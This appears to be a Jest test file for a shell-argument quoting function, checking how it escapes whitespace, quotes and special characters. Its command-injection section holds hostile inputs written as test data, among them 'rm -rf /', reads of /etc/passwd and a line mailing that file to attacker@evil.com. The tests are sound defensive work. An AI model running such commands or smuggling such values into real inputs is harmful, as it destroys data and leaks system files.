import { describe, expect, it } from '@jest/globals';
import { quote } from './quote';

describe('quote', () => {
  describe('empty string handling', () => {
    it("should return $'' for empty string", () => {
      expect(quote('')).toBe(`$''`);
    });
  });

  describe('safe strings (no escaping needed)', () => {
    it('should return unchanged for alphanumeric strings', () => {
      expect(quote('hello')).toBe('hello');
      expect(quote('test123')).toBe('test123');
      expect(quote('HelloWorld')).toBe('HelloWorld');
    });

    it('should return unchanged for strings with allowed special characters', () => {
      expect(quote('file.txt')).toBe('file.txt');
      expect(quote('/path/to/file')).toBe('/path/to/file');
      expect(quote('user@domain.com')).toBe('user@domain.com');
      expect(quote('key=value')).toBe('key=value');
      expect(quote('some-file-name')).toBe('some-file-name');
      expect(quote('path/file.ext')).toBe('path/file.ext');
    });

    it('should return unchanged for mixed safe characters', () => {
      expect(quote('user123@example.com')).toBe('user123@example.com');
      expect(quote('/home/user/file-name.txt')).toBe('/home/user/file-name.txt');
      expect(quote('config=value123')).toBe('config=value123');
    });
  });

  describe('unsafe strings (escaping required)', () => {
    describe('whitespace characters', () => {
      it('should escape spaces', () => {
        expect(quote('hello world')).toBe(`$'hello world'`);
      });

      it('should escape tab characters', () => {
        expect(quote('hello\tworld')).toBe(`$'hello\\tworld'`);
      });

      it('should escape newline characters', () => {
        expect(quote('hello\nworld')).toBe(`$'hello\\nworld'`);
      });

      it('should escape carriage return characters', () => {
        expect(quote('hello\rworld')).toBe(`$'hello\\rworld'`);
      });

      it('should escape vertical tab characters', () => {
        expect(quote('hello\vworld')).toBe(`$'hello\\vworld'`);
      });

      it('should escape form feed characters', () => {
        expect(quote('hello\fworld')).toBe(`$'hello\\fworld'`);
      });
    });

    describe('quote characters', () => {
      it('should escape single quotes', () => {
        expect(quote("hello'world")).toBe(`$'hello\\'world'`);
        expect(quote("it's")).toBe(`$'it\\'s'`);
      });

      it('should escape double quotes', () => {
        expect(quote('hello"world')).toBe(`$'hello\\"world'`);
        expect(quote('"quoted"')).toBe(`$'\\"quoted\\"'`);
      });

      it('should escape mixed quotes', () => {
        expect(quote(`hello"world'test`)).toBe(`$'hello\\"world\\'test'`);
      });
    });

    describe('backslash characters', () => {
      it('should escape backslashes', () => {
        expect(quote('hello\\world')).toBe(`$'hello\\\\world'`);
        expect(quote('C:\\path\\to\\file')).toBe(`$'C:\\\\path\\\\to\\\\file'`);
      });
    });

    describe('null characters', () => {
      it('should escape null characters', () => {
        expect(quote('hello\0world')).toBe(`$'hello\\0world'`);
      });
    });

    describe('special shell characters', () => {
      it('should escape parentheses', () => {
        expect(quote('hello(world)')).toBe(`$'hello(world)'`);
      });

      it('should escape brackets', () => {
        expect(quote('hello[world]')).toBe(`$'hello[world]'`);
      });

      it('should escape braces', () => {
        expect(quote('hello{world}')).toBe(`$'hello{world}'`);
      });

      it('should escape semicolons', () => {
        expect(quote('cmd1;cmd2')).toBe(`$'cmd1;cmd2'`);
      });

      it('should escape pipes', () => {
        expect(quote('cmd1|cmd2')).toBe(`$'cmd1|cmd2'`);
      });

      it('should escape ampersands', () => {
        expect(quote('cmd1&cmd2')).toBe(`$'cmd1&cmd2'`);
      });

      it('should escape dollar signs', () => {
        expect(quote('$variable')).toBe(`$'$variable'`);
      });

      it('should escape asterisks', () => {
        expect(quote('*.txt')).toBe(`$'*.txt'`);
      });

      it('should escape question marks', () => {
        expect(quote('file?.txt')).toBe(`$'file?.txt'`);
      });
    });

    describe('complex escape scenarios', () => {
      it('should handle multiple escape characters', () => {
        expect(quote('hello\n\t"world"')).toBe(`$'hello\\n\\t\\"world\\"'`);
      });

      it('should handle backslashes with quotes', () => {
        expect(quote(`path\\to\\"file"`)).toBe(`$'path\\\\to\\\\\\"file\\"'`);
      });

      it('should handle all escape characters together', () => {
        const input = `test\\\n\r\t\f\v\0"'`;
        const expected = `$'test\\\\\\n\\r\\t\\f\\v\\0\\"\\''`;
        expect(quote(input)).toBe(expected);
      });
    });

    describe('edge cases', () => {
      it('should handle strings with only special characters', () => {
        expect(quote('!@#$%^&*()')).toBe(`$'!@#$%^&*()'`);
      });

      it('should handle Unicode characters', () => {
        expect(quote('hello🌍world')).toBe(`$'hello🌍world'`);
        expect(quote('café')).toBe(`$'café'`);
      });

      it('should handle very long strings', () => {
        const longString = 'a'.repeat(1000) + ' ' + 'b'.repeat(1000);
        const result = quote(longString);
        expect(result).toBe(`$'${'a'.repeat(1000)} ${'b'.repeat(1000)}'`);
      });
    });

    describe('command injection prevention', () => {
      it('should escape command chaining with &&', () => {
        const maliciousInput = 'fast" && touch $HOME/Desktop/test.txt || echo "';
        expect(quote(maliciousInput)).toBe(`$'fast\\" && touch $HOME/Desktop/test.txt || echo \\"'`);
      });

      it('should escape command chaining with ||', () => {
        const maliciousInput = 'file" || rm -rf / && echo "safe';
        expect(quote(maliciousInput)).toBe(`$'file\\" || rm -rf / && echo \\"safe'`);
      });

      it('should escape command substitution with backticks', () => {
        const maliciousInput = 'file`rm -rf /`name';
        expect(quote(maliciousInput)).toBe(`$'file\`rm -rf /\`name'`);
      });

      it('should escape command substitution with $(...)', () => {
        const maliciousInput = 'file$(rm -rf /)name';
        expect(quote(maliciousInput)).toBe(`$'file$(rm -rf /)name'`);
      });

      it('should escape pipe commands', () => {
        const maliciousInput = 'input | cat /etc/passwd';
        expect(quote(maliciousInput)).toBe(`$'input | cat /etc/passwd'`);
      });

      it('should escape redirections', () => {
        const maliciousInput = 'input > /tmp/malicious.txt';
        expect(quote(maliciousInput)).toBe(`$'input > /tmp/malicious.txt'`);
      });

      it('should escape variable expansion attempts', () => {
        const maliciousInput = 'path/$HOME/sensitive';
        expect(quote(maliciousInput)).toBe(`$'path/$HOME/sensitive'`);
      });

      it('should escape semicolon command separation', () => {
        const maliciousInput = 'safe; rm -rf /; echo done';
        expect(quote(maliciousInput)).toBe(`$'safe; rm -rf /; echo done'`);
      });

      it('should escape complex injection with mixed operators', () => {
        const maliciousInput = 'file"; cat /etc/passwd | mail attacker@evil.com && rm -rf / || echo "done';
        expect(quote(maliciousInput)).toBe(
          `$'file\\"; cat /etc/passwd | mail attacker@evil.com && rm -rf / || echo \\"done'`,
        );
      });

      it('should escape newline-based injection', () => {
        const maliciousInput = 'safe\nrm -rf /\necho injected';
        expect(quote(maliciousInput)).toBe(`$'safe\\nrm -rf /\\necho injected'`);
      });

      it('should escape null byte injection', () => {
        const maliciousInput = 'safe\0rm -rf /';
        expect(quote(maliciousInput)).toBe(`$'safe\\0rm -rf /'`);
      });

      it('should escape environment variable injection', () => {
        const maliciousInput = 'PATH=/tmp:$PATH; malicious-script';
        expect(quote(maliciousInput)).toBe(`$'PATH=/tmp:$PATH; malicious-script'`);
      });
    });
  });
});
